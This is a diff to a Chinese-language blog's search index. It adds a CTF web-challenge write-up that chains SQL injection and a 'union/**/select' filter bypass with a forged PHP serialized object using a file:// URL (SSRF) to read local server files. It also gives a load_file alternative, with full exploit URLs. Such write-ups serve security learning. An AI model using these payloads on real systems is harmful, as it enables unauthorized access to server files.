@@ -1,6 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>fakeblog WP</title>
+    <url>/2020/06/03/fakeblog/</url>
+    <content><![CDATA[<p>看上去像是一个分享博客的网站，可添加博客地址，我直接添加一条数据</p>
+<p><img src="/2020/06/03/fakeblog/01.png" alt="01"></p>
+<p>点击用户名可查看详情<br><img src="/2020/06/03/fakeblog/02.png" alt="02"></p>
+<p>在<code>url</code>后面加一个引号发现输出了报错信息，<code>no</code>参数可能存在注入<br><img src="/2020/06/03/fakeblog/03.png" alt="03"></p>
+<p>可以报错注入，但注意貌似处理了<code>0x</code><br><img src="/2020/06/03/fakeblog/04.png" alt="04"></p>
+<p>试了一下<code>union select</code>,提示警告，使用<code>union/**/select</code>可绕过,然后就走一般流程获取表名、列名，这里共四列，<code>2</code>位置可以显示数据，测试一下，权限不够不能写入<code>webshell</code><br><img src="/2020/06/03/fakeblog/05.png" alt="05"><br><img src="/2020/06/03/fakeblog/06.png" alt="06"><br><img src="/2020/06/03/fakeblog/07.png" alt="07"></p>
+<p>有个<code>data</code>,查看一下发现是<code>php</code>序列化的字符串,其中<code>blog</code>的值就是添加数据时输入的<code>URL</code><br><img src="/2020/06/03/fakeblog/08.png" alt="08"><br>结合题目分析，后台可能去访问博客地址了并将内容返回,这样的话就可能存在<code>SSRF</code>。<br><img src="/2020/06/03/fakeblog/09.png" alt="09"><br>同时发现<code>robots.txt</code>中泄露了敏感文件,内容是<code>UserInfo</code>类</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重点关注<code>get</code>方法,其中将访问博客地址，页面<code>404</code>就返回<code>404</code>，有内容就返回内容。这点和猜测的一样,直接构造<code>Payload</code>利用<code>file://</code>将博客地址指定后台的本地文件。使用<code>union select</code>传递<code>payload</code>,这里<code>data</code>字段在第四个,先尝试读取<code>/var/www/html/flag.txt</code>失败,而<code>/var/www/html/flag.php</code>中可直接读取到<code>flag</code>。</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://220.249.52.133:31745/view.php?no=0 union/**/select 1,(select data from users),3,'O:8:"UserInfo":3:&#123;s:4:"name";s:4:"la2y";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125; '</span><br></pre></td></tr></table></figure>
+<p>反序列化正常，页面没有报错信息，此时查看下方的博客内容部分的源码即可。<br><img src="/2020/06/03/fakeblog/10.png" alt="10"></p>
+<p><img src="/2020/06/03/fakeblog/11.png" alt="11"></p>
+<p>由于没有过滤<code>load_file</code>，也可以直接使用<code>load_file</code>读取文件。</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://220.249.52.133:31745/view.php?no=0 union/**/select 1,(select load_file('/var/www/html/flag.php')),3,4</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>反序列化</tag>
+        <tag>SSRF</tag>
+        <tag>sqli</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CISCN 2019-Bilibili WP</title>
     <url>/2020/06/02/bilibili/</url>
     <content><![CDATA[<p>这一题主要考察<code>JWT</code>的伪造以及<code>Pikle</code>反序列化</p>
@@ -31,8 +54,8 @@
 <p><img src="/2020/06/02/bilibili/flag.png" alt="flag"></p>
 ]]></content>
       <tags>
-        <tag>反序列化</tag>
         <tag>python</tag>
+        <tag>反序列化</tag>
         <tag>JWT</tag>
       </tags>
   </entry>
@@ -225,9 +248,9 @@
         <category>CTF-WEB</category>
       </categories>
       <tags>
+        <tag>反序列化</tag>
         <tag>强网杯</tag>
         <tag>CTF</tag>
-        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
